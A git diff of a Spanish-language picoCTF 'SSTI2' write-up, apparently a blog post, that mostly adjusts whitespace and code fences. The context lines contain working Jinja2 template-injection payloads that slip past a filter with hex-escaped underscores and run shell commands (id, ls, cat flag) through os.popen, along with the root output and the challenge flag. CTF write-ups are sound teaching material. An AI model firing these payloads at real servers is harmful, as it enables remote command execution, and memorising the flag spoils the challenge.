@@ -7,6 +7,7 @@ image:
     path: https://picoctf.org/img/logos/pico-mark.svg
     alt: PicoCTF
 ---
+
 >SSTI2
 Author: Venax
 Description
@@ -141,6 +142,7 @@ Se utiliza cuando se hace uso de Jinja2 en un proyecto de esta forma. Y es la mi
 \{\{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()\}\}
 
 Resultado somos root
+
 ```
 uid=0(root) gid=0(root) groups=0(root) 
 ```
@@ -149,16 +151,18 @@ Buscamos la flag primero lanzando un ls
 \{\{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()\}\}
 
 Encontramos el archivo flag
+
 ```
 __pycache__ app.py flag requirements.txt 
 ```
+
 Ya solo queda leer el archivo
 
 \{\{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()\}\}
 
-```
+
 picoCTF{sst1_f1lt3r_byp4ss_0ef4bd3d}
-```
+
 flag: **picoCTF{sst1_f1lt3r_byp4ss_0ef4bd3d}**
 
 Nota: Si alguno de estos payloads no te funciona prueba a juntar las llaves "{" pues es problemático para Chirpy.
